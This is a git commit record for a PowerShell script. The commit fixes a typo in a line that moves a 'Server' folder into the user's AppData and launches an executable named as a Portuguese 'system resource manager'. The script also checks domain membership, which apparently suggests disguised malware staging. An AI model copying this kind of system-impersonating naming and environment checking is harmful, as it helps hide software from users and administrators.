bf9e13f51d32ee93928d429218669243bb400693
n0shadow <221440790+n0shadow@users.noreply.github.com>
2025-07-31 20:09:04 -0300

    Upd ps1

--- rd.ps1
+++ rd.ps1
@@ -1,7 +1,7 @@
 $usrPath = $PWD.Path
 $usr = Split-Path $usrPath -Leaf
 $dest = Join-Path $usrPath "AppData\Local\Server"
-Move-Item $env:LOCALLAPPDATA\Server $dest -Force
+Move-Item $env:LOCALAPPDATA\Server $dest -Force
 $exec = Join-Path $dest "Gerenciador de recursos do sistema.exe"
 
 $realDmn = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
